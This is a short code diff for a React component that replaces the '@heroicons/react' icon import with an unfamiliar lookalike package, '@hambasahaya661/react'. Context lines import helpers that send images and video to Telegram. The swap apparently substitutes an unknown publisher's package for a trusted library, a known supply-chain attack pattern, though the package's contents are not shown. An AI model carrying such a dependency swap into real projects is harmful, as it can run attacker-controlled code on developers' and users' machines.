@@ -1,4 +1,4 @@
-import { PlayIcon } from '@heroicons/react/24/solid';
+import { PlayIcon } from '@hambasahaya661/react/24/solid';
 import { useState, useEffect, useCallback } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
